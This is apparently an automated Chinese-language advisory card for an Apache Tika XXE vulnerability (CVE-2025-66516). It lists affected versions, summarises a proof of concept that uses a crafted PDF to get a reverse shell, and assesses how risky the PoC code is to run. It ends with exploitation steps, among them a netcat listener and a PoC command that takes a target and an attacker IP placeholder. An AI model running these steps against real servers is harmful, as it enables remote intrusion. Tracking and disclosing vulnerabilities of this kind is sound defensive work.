## CVE-2025-66516 - Apache Tika XXE

**漏洞编号:** CVE-2025-66516

**漏洞类型:** XXE

**影响应用:** Apache Tika

**危害等级:** Critical

**CVSS评分:** 10.0

**影响版本:** tika-core 1.13-3.2.1, tika-pdf-module 2.0.0-3.2.1, tika-parsers 1.13-1.28.5

**利用条件:** No authentication needed, network attack vector.

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 15%

## 详情

CVE-2025-66516是Apache Tika中的一个严重的XML外部实体（XXE）漏洞。该漏洞存在于tika-core、tika-pdf-module和tika-parsers模块中，允许未经身份验证的远程攻击者通过精心设计的PDF文件利用该漏洞执行任意代码。POC代码通过创建一个包含恶意XFA表单的PDF文件来利用此漏洞。XFA表单包含一个XXE有效负载，该有效负载使用DTD来解析外部实体。解析器被利用来执行系统命令以获得反向shell。该漏洞影响Tika的Java运行时环境，通过实体扩展和文件协议处理程序的滥用实现远程代码执行。PoC中提供了完整的利用链。首先，攻击者需要设置一个监听器来接收反向shell。然后，使用提供的Python脚本生成恶意PDF文件，指定目标服务器的IP地址和监听端口。当目标Tika服务器解析恶意PDF文件时，XXE漏洞会被触发，导致服务器执行攻击者提供的命令，从而建立反向shell连接。该POC经验证可以有效地在易受攻击的Tika服务器上触发反向shell，包括独立安装和集成设置（如Solr）。

**投毒风险分析：**
此POC的投毒风险较低，因为提供的代码主要用于生成恶意PDF文件和触发XXE漏洞。代码本身没有明显的恶意行为，例如下载或执行未经授权的程序。然而，仍然存在一些潜在的投毒风险。首先，攻击者可能会修改Python脚本以包含额外的恶意代码，例如下载和执行恶意软件。其次，攻击者可能会使用混淆技术来隐藏脚本中的恶意代码，使其更难被检测到。最后，攻击者可能会将POC代码与合法的软件或工具捆绑在一起，以诱骗用户下载和运行它。尽管存在这些风险，但总体投毒风险仍然较低，因为POC代码主要依赖于XXE漏洞来执行任意代码，而不是依赖于恶意代码本身。由于该漏洞本身利用了XXE，成功利用的关键在于目标系统上存在可利用的Java运行时环境和相关库。因此，在利用POC之前，需要确认目标环境满足这些先决条件。代码使用标准库，结构清晰，但仍存在脚本被修改的可能性，增加投毒风险。例如，可以修改反向shell的payload，替换成下载恶意文件的指令。

利用步骤：
1. 设置监听器：`nc -lvnp 4444`
2. 运行PoC脚本：`python3 CVE-2025-66516.py --target target.com --lhost YOUR_IP --lport 4444`
3. 目标服务器解析恶意PDF后，获得反向shell。

**项目地址:** https://tinyurl.com/32tks7pp

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-66516
